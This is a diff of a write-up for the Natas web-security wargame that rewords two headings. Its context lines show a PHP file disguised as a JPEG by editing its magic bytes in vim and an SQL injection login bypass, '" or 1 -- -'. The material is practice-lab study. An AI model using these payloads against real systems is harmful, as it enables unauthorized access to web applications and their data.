@@ -406,7 +406,7 @@ Edit magic numbers to become a fake .jpg file (on linux terminal) (-b binary mod
 ```
 vim -b showpass.php
 ```
-Simple vim tr1x On vim, to edit hex file
+Simple tr1x On vim, to edit hex file
 ```
 :%!xxd
 ```
@@ -469,7 +469,7 @@ If you try: " (double-quote) you will get an sql error based on the query
 Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /var/www/natas/natas14/index.php on line 24
 Access denied!
 ```
-Inject SQLi
+Inject SQL query
 ```
 " or 1 -- -
 Login
